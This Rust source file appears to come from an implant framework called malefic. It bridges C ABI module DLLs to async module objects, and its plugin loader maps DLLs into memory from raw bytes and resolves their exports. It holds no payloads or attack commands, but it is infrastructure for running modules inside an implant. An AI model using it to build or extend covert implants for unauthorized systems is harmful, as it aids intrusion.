//! Host-side bridge: wraps C ABI module exports into standard `Module` trait objects.
//!
//! The bridge uses `std::sync::mpsc` channels + `spawn_blocking` to connect
//! the blocking `rt_module_run` call with the async runtime.
//! Runtime-agnostic: uses `malefic_common::{spawn, spawn_blocking, join_handle}`
//! instead of tokio-specific APIs.

use std::sync::{mpsc as std_mpsc, Arc};

/// Wrapper to make raw pointers `Send` for use in async tasks.
/// SAFETY: Caller must guarantee the pointee outlives the task.
struct SendPtr(usize);
unsafe impl Send for SendPtr {}
unsafe impl Sync for SendPtr {}
impl SendPtr {
    fn new<T>(ptr: *mut T) -> Self {
        Self(ptr as usize)
    }
    unsafe fn as_mut<T>(&self) -> &mut T {
        &mut *(self.0 as *mut T)
    }
}

use async_trait::async_trait;
use futures::StreamExt;

use malefic_module::{
    Input, MaleficBundle, MaleficModule, Module, ModuleImpl, ModuleResult, Output, TaskResult,
};
use malefic_proto::proto::implantpb::spite::Body;
use malefic_proto::proto::implantpb::{Spite, Status};

use crate::abi::{
    RtBuffer, RtHostFreeFn, RtModuleHandle, RtRecvFn, RtSendFn, RtStatus, RtTryRecvFn,
};
use crate::codec;

// ── BridgeContext + Trampolines ─────────────────────────────────────────────

/// Sync bridge between the blocking `rt_module_run` thread and the async host.
///
/// Also used by `malefic-runtime-ffi` to drive modules from a synchronous FFI host.
pub struct BridgeContext {
    pub output_tx: std_mpsc::Sender<Vec<u8>>,
    pub input_rx: std_mpsc::Receiver<Vec<u8>>,
}

pub unsafe extern "C" fn bridge_send(
    ctx: *mut core::ffi::c_void,
    data: *const u8,
    len: u32,
) -> i32 {
    let bridge = &*(ctx as *const BridgeContext);
    let bytes = core::slice::from_raw_parts(data, len as usize).to_vec();
    if bridge.output_tx.send(bytes).is_ok() {
        0
    } else {
        -1
    }
}

pub unsafe extern "C" fn bridge_recv(
    ctx: *mut core::ffi::c_void,
    out_data: *mut *mut u8,
    out_len: *mut u32,
) -> i32 {
    let bridge = &*(ctx as *const BridgeContext);
    match bridge.input_rx.recv() {
        Ok(bytes) => {
            let buf = RtBuffer::from_vec(bytes);
            *out_data = buf.ptr;
            *out_len = buf.len;
            core::mem::forget(buf);
            0
        }
        Err(_) => -1,
    }
}

pub unsafe extern "C" fn bridge_try_recv(
    ctx: *mut core::ffi::c_void,
    out_data: *mut *mut u8,
    out_len: *mut u32,
) -> i32 {
    let bridge = &*(ctx as *const BridgeContext);
    match bridge.input_rx.try_recv() {
        Ok(bytes) => {
            let buf = RtBuffer::from_vec(bytes);
            *out_data = buf.ptr;
            *out_len = buf.len;
            core::mem::forget(buf);
            0
        }
        Err(std_mpsc::TryRecvError::Empty) => -1,
        Err(std_mpsc::TryRecvError::Disconnected) => -2,
    }
}

pub unsafe extern "C" fn bridge_host_free(ptr: *mut u8, len: u32) {
    if !ptr.is_null() && len > 0 {
        let _ = Vec::from_raw_parts(ptr, len as usize, len as usize);
    }
}

// ── RtVTable ────────────────────────────────────────────────────────────────

/// Resolved function pointers from a module DLL.
pub struct RtVTable {
    pub abi_version: unsafe extern "C" fn() -> u32,
    pub module_count: unsafe extern "C" fn() -> u32,
    pub module_name: unsafe extern "C" fn(u32) -> RtBuffer,
    pub module_create: unsafe extern "C" fn(*const u8, u32) -> *mut RtModuleHandle,
    pub module_destroy: unsafe extern "C" fn(*mut RtModuleHandle),
    pub module_run: unsafe extern "C" fn(
        *mut RtModuleHandle,
        u32,
        *mut core::ffi::c_void,
        RtSendFn,
        RtRecvFn,
        RtTryRecvFn,
        RtHostFreeFn,
        *mut RtBuffer,
    ) -> RtStatus,
    pub free: unsafe extern "C" fn(RtBuffer),
}

unsafe impl Send for RtVTable {}
unsafe impl Sync for RtVTable {}

impl RtVTable {
    pub unsafe fn resolve<F>(find_export: F) -> Option<Self>
    where
        F: Fn(&str) -> Option<*const core::ffi::c_void>,
    {
        macro_rules! resolve_fn {
            ($name:expr, $ty:ty) => {
                core::mem::transmute::<*const core::ffi::c_void, $ty>(find_export($name)?)
            };
        }

        let vtable = Self {
            abi_version: resolve_fn!("rt_abi_version", unsafe extern "C" fn() -> u32),
            module_count: resolve_fn!("rt_module_count", unsafe extern "C" fn() -> u32),
            module_name: resolve_fn!("rt_module_name", unsafe extern "C" fn(u32) -> RtBuffer),
            module_create: resolve_fn!(
                "rt_module_create",
                unsafe extern "C" fn(*const u8, u32) -> *mut RtModuleHandle
            ),
            module_destroy: resolve_fn!(
                "rt_module_destroy",
                unsafe extern "C" fn(*mut RtModuleHandle)
            ),
            module_run: resolve_fn!(
                "rt_module_run",
                unsafe extern "C" fn(
                    *mut RtModuleHandle,
                    u32,
                    *mut core::ffi::c_void,
                    RtSendFn,
                    RtRecvFn,
                    RtTryRecvFn,
                    RtHostFreeFn,
                    *mut RtBuffer,
                ) -> RtStatus
            ),
            free: resolve_fn!("rt_free", unsafe extern "C" fn(RtBuffer)),
        };

        if (vtable.abi_version)() != crate::abi::RT_ABI_VERSION {
            return None;
        }

        Some(vtable)
    }
}

// ── RtBufferGuard ───────────────────────────────────────────────────────────

struct RtBufferGuard {
    buf: RtBuffer,
    free_fn: unsafe extern "C" fn(RtBuffer),
}

impl RtBufferGuard {
    fn new(buf: RtBuffer, free_fn: unsafe extern "C" fn(RtBuffer)) -> Self {
        Self { buf, free_fn }
    }

    fn as_bytes(&self) -> &[u8] {
        unsafe { self.buf.as_bytes() }
    }
}

impl Drop for RtBufferGuard {
    fn drop(&mut self) {
        if !self.buf.ptr.is_null() && self.buf.len > 0 {
            let buf = core::mem::replace(&mut self.buf, RtBuffer::empty());
            unsafe { (self.free_fn)(buf) };
        }
    }
}

// ── RtBundle ────────────────────────────────────────────────────────────────

pub struct RtBundle {
    vtable: Arc<RtVTable>,
    module_names: Vec<String>,
}

impl RtBundle {
    pub unsafe fn try_new(vtable: RtVTable) -> Option<Self> {
        let count = (vtable.module_count)();
        let mut names = Vec::with_capacity(count as usize);

        for i in 0..count {
            let buf = RtBufferGuard::new((vtable.module_name)(i), vtable.free);
            let name = core::str::from_utf8(buf.as_bytes())
                .unwrap_or("")
                .to_string();
            if !name.is_empty() {
                names.push(name);
            }
        }

        Some(Self {
            vtable: Arc::new(vtable),
            module_names: names,
        })
    }

    pub fn module_names(&self) -> &[String] {
        &self.module_names
    }

    pub fn into_bundle(self) -> MaleficBundle {
        let mut map = MaleficBundle::new();
        for name in &self.module_names {
            let module = RtModuleProxy {
                name: name.clone(),
                vtable: Arc::clone(&self.vtable),
            };
            map.insert(name.clone(), Box::new(module) as Box<MaleficModule>);
        }
        map
    }
}

// ── RtModuleProxy ───────────────────────────────────────────────────────────

pub struct RtModuleProxy {
    name: String,
    vtable: Arc<RtVTable>,
}

unsafe impl Send for RtModuleProxy {}
unsafe impl Sync for RtModuleProxy {}

#[async_trait]
impl Module for RtModuleProxy {
    fn name() -> &'static str
    where
        Self: Sized,
    {
        "rt_module"
    }
    fn new() -> Self
    where
        Self: Sized,
    {
        unreachable!("RtModuleProxy is created via RtBundle")
    }
    fn new_instance(&self) -> Box<MaleficModule> {
        Box::new(RtModuleProxy {
            name: self.name.clone(),
            vtable: Arc::clone(&self.vtable),
        })
    }
}

#[async_trait]
impl ModuleImpl for RtModuleProxy {
    async fn run(
        &mut self,
        id: u32,
        recv_channel: &mut Input,
        send_channel: &mut Output,
    ) -> ModuleResult {
        // 1. Create module instance — store as usize to avoid !Send issues.
        let handle_addr = unsafe {
            let h = (self.vtable.module_create)(self.name.as_ptr(), self.name.len() as u32);
            if h.is_null() {
                return Err(anyhow::anyhow!("failed to create module '{}'", self.name));
            }
            h as usize
        };
        let destroy_fn_addr = self.vtable.module_destroy as usize;
        let run_fn_addr = self.vtable.module_run as usize;

        // 2. Create sync channel pairs.
        let (input_sync_tx, input_sync_rx) = std_mpsc::channel::<Vec<u8>>();
        let (output_sync_tx, output_sync_rx) = std_mpsc::channel::<Vec<u8>>();

        // 3. Input forwarder: async recv_channel → sync input_tx.
        //    Uses a shared flag to signal shutdown instead of abort().
        let input_shutdown = Arc::new(std::sync::atomic::AtomicBool::new(false));
        let input_shutdown_clone = input_shutdown.clone();
        let tx = input_sync_tx;
        let recv_send = SendPtr::new(recv_channel as *mut Input);
        let _input_task = malefic_common::spawn(async move {
            while !input_shutdown_clone.load(std::sync::atomic::Ordering::Relaxed) {
                let recv = unsafe { recv_send.as_mut::<Input>() };
                match recv.next().await {
                    Some(body) => {
                        let spite = Spite {
                            task_id: id,
                            body: Some(body),
                            ..Default::default()
                        };
                        let bytes = codec::encode_spite(&spite);
                        if tx.send(bytes).is_err() {
                            break;
                        }
                    }
                    None => break,
                }
            }
        });

        // 4. Output reader: sync output_rx → async send_channel.
        //    Uses spawn_blocking to bridge sync recv → async send.
        let output_sender = send_channel.clone();
        let (async_out_tx, mut async_out_rx) = futures_channel::mpsc::unbounded::<Vec<u8>>();

        let _output_reader = malefic_common::spawn_blocking(move || {
            while let Ok(bytes) = output_sync_rx.recv() {
                if async_out_tx.unbounded_send(bytes).is_err() {
                    break;
                }
            }
        });

        let output_forwarder = malefic_common::spawn(async move {
            while let Some(bytes) = async_out_rx.next().await {
                if let Ok(spite) = codec::decode_spite(&bytes) {
                    let body = spite.body.unwrap_or(Body::Empty(Default::default()));
                    let status = spite.status.unwrap_or(Status {
                        task_id: id,
                        status: 0,
                        error: String::default(),
                    });
                    let _ = output_sender.unbounded_send(TaskResult {
                        task_id: id,
                        body,
                        status,
                    });
                }
            }
        });

        // 5. Blocking call: rt_module_run.
        let free_fn_addr = self.vtable.free as usize;
        let module_result = malefic_common::spawn_blocking(move || {
            type RunFnType = unsafe extern "C" fn(
                *mut RtModuleHandle,
                u32,
                *mut core::ffi::c_void,
                RtSendFn,
                RtRecvFn,
                RtTryRecvFn,
                RtHostFreeFn,
                *mut RtBuffer,
            ) -> RtStatus;

            let run_fn: RunFnType = unsafe { core::mem::transmute(run_fn_addr) };
            let handle_ptr = handle_addr as *mut RtModuleHandle;

            let bridge = BridgeContext {
                output_tx: output_sync_tx,
                input_rx: input_sync_rx,
            };
            let ctx = &bridge as *const BridgeContext as *mut core::ffi::c_void;

            let mut final_out = RtBuffer::empty();
            let status = unsafe {
                run_fn(
                    handle_ptr,
                    id,
                    ctx,
                    bridge_send,
                    bridge_recv,
                    bridge_try_recv,
                    bridge_host_free,
                    &mut final_out,
                )
            };
            // Copy the output bytes, then free via the MODULE's rt_free (not host's).
            // final_out was allocated by the module DLL — using host's allocator
            // to free it would be UB when compiled with a different Rust version.
            let out_bytes = unsafe { final_out.as_bytes().to_vec() };
            if !final_out.is_empty() {
                let module_free: unsafe extern "C" fn(RtBuffer) =
                    unsafe { core::mem::transmute(free_fn_addr) };
                unsafe { module_free(final_out) };
            }
            (status, out_bytes)
            // BridgeContext drops here → output_tx dropped → output_reader exits
        });

        // 6. Wait for the module to finish.
        let (status, out_bytes) = malefic_common::join_handle(module_result).await?;

        // Signal input forwarder to stop.
        input_shutdown.store(true, std::sync::atomic::Ordering::Relaxed);

        // Destroy the module instance.
        // This drops BridgeContext.output_tx → output_reader detects disconnect
        // → drops async_out_tx → output_forwarder stream ends.
        unsafe {
            let destroy_fn: unsafe extern "C" fn(*mut RtModuleHandle) =
                core::mem::transmute(destroy_fn_addr);
            destroy_fn(handle_addr as *mut RtModuleHandle);
        }

        // Wait for the output forwarder to drain all remaining intermediate results.
        let _ = malefic_common::join_handle(output_forwarder).await;

        match status {
            RtStatus::Done => {
                let spite = codec::decode_spite(&out_bytes)?;
                let body = spite.body.unwrap_or(Body::Empty(Default::default()));
                let status = spite.status.unwrap_or(Status {
                    task_id: id,
                    status: 0,
                    error: String::default(),
                });
                Ok(TaskResult {
                    task_id: id,
                    body,
                    status,
                })
            }
            RtStatus::Error => {
                let msg = core::str::from_utf8(&out_bytes).unwrap_or("unknown error");
                Err(anyhow::anyhow!("module '{}': {}", self.name, msg))
            }
        }
    }
}

// ── RtBridge ──────────────────────────────────────────────────────────────
//
// Wraps any `Box<dyn Module>` and overrides `ModuleImpl::run()` to call
// `Module::rt_run()` inside `spawn_blocking`. This ensures all modules
// (built-in and DLL) execute on the blocking thread pool, never on tokio
// workers.
//
// Used by Manager::reload() to wrap every registered module.

pub struct RtBridge {
    inner: Box<MaleficModule>,
}

impl RtBridge {
    pub fn wrap(module: Box<MaleficModule>) -> Box<MaleficModule> {
        Box::new(Self { inner: module })
    }
}

// ── PluginLoader ───────────────────────────────────────────────────────────
//
// Owns the lifecycle of a loaded DLL: load → resolve → enumerate → unload.
// Manager calls PluginLoader; PluginLoader calls malefic-loader for PE ops
// and RtVTable/RtBundle for C ABI resolution.

use std::collections::HashMap;

/// A loaded plugin DLL with its resolved modules.
pub struct LoadedPlugin {
    /// Opaque PE handle from malefic-loader. Kept alive so exports remain valid.
    handle: *const core::ffi::c_void,
    /// Module names exported by this plugin.
    module_names: Vec<String>,
}

unsafe impl Send for LoadedPlugin {}
unsafe impl Sync for LoadedPlugin {}

impl LoadedPlugin {
    pub fn module_names(&self) -> &[String] {
        &self.module_names
    }
}

/// Manages loaded plugin DLLs and their module lifecycles.
pub struct PluginLoader {
    /// plugin_name → LoadedPlugin
    plugins: HashMap<String, LoadedPlugin>,
}

impl PluginLoader {
    pub fn new() -> Self {
        Self {
            plugins: HashMap::new(),
        }
    }

    /// Load a DLL from raw bytes, resolve rt_* C ABI exports, return modules.
    ///
    /// The DLL handle is kept alive internally. Call `unload()` to free it.
    /// Returns `(plugin_name, MaleficBundle)` on success.
    #[cfg(all(target_os = "windows", feature = "loader"))]
    pub unsafe fn load(
        &mut self,
        name: String,
        bin: Vec<u8>,
    ) -> Result<MaleficBundle, anyhow::Error> {
        let handle = malefic_loader::hot_modules::load_module(bin, name.clone())
            .map_err(|e| anyhow::anyhow!("PE load failed: {:?}", e))?;

        let vtable = RtVTable::resolve(|export_name| {
            malefic_loader::hot_modules::find_export(handle, export_name)
        })
        .ok_or_else(|| anyhow::anyhow!("no rt_* exports found in '{}'", name))?;

        let rt_bundle = RtBundle::try_new(vtable)
            .ok_or_else(|| anyhow::anyhow!("RtBundle init failed for '{}'", name))?;

        let module_names = rt_bundle.module_names().to_vec();
        let bundle = rt_bundle.into_bundle();

        self.plugins.insert(
            name,
            LoadedPlugin {
                handle,
                module_names,
            },
        );

        Ok(bundle)
    }

    /// Unload a previously loaded plugin DLL.
    ///
    /// Returns the list of module names that were provided by this plugin,
    /// so the caller can remove them from the module registry.
    #[cfg(all(target_os = "windows", feature = "loader"))]
    pub unsafe fn unload(&mut self, name: &str) -> Option<Vec<String>> {
        if let Some(plugin) = self.plugins.remove(name) {
            let names = plugin.module_names;
            // Use no_tls variant: Rust DLLs' DLL_PROCESS_DETACH triggers TLS
            // cleanup that can stack overflow in PE-memory-loaded modules.
            malefic_loader::hot_modules::unload_pe_no_tls(plugin.handle);
            Some(names)
        } else {
            None
        }
    }

    /// List all loaded plugin names.
    pub fn loaded_plugins(&self) -> Vec<&str> {
        self.plugins.keys().map(|s| s.as_str()).collect()
    }

    /// Check if a plugin is loaded.
    pub fn is_loaded(&self, name: &str) -> bool {
        self.plugins.contains_key(name)
    }

    /// Return a mapping of module_name → plugin_name for all loaded plugins.
    pub fn module_plugin_map(&self) -> HashMap<String, String> {
        let mut map = HashMap::new();
        for (plugin_name, plugin) in &self.plugins {
            for module_name in plugin.module_names() {
                map.insert(module_name.clone(), plugin_name.clone());
            }
        }
        map
    }
}

#[async_trait]
impl Module for RtBridge {
    fn name() -> &'static str
    where
        Self: Sized,
    {
        "rt_bridge"
    }
    fn new() -> Self
    where
        Self: Sized,
    {
        unreachable!("RtBridge is constructed via wrap()")
    }
    fn new_instance(&self) -> Box<MaleficModule> {
        Self::wrap(self.inner.new_instance())
    }
}

#[async_trait]
impl ModuleImpl for RtBridge {
    async fn run(
        &mut self,
        id: u32,
        recv_channel: &mut Input,
        send_channel: &mut Output,
    ) -> ModuleResult {
        // SAFETY: pointers are valid for the duration of spawn_blocking.
        // RtBridge::run() is awaited by scheduler, so self/recv/send outlive
        // the blocking task.
        //
        // For the trait object (fat pointer), we transmute to [usize; 2] to
        // capture both data pointer and vtable, then reconstruct on the other side.
        let module_raw: [usize; 2] =
            unsafe { core::mem::transmute(&mut *self.inner as *mut MaleficModule) };
        let recv_ptr = recv_channel as *mut Input as usize;
        let send_ptr = send_channel as *mut Output as usize;

        let result = malefic_common::spawn_blocking(move || {
            let module: &mut MaleficModule =
                unsafe { &mut *core::mem::transmute::<[usize; 2], *mut MaleficModule>(module_raw) };
            let recv = unsafe { &mut *(recv_ptr as *mut Input) };
            let send = unsafe { &mut *(send_ptr as *mut Output) };
            module.rt_run(id, recv, send)
        });

        malefic_common::join_handle(result).await?
    }
}
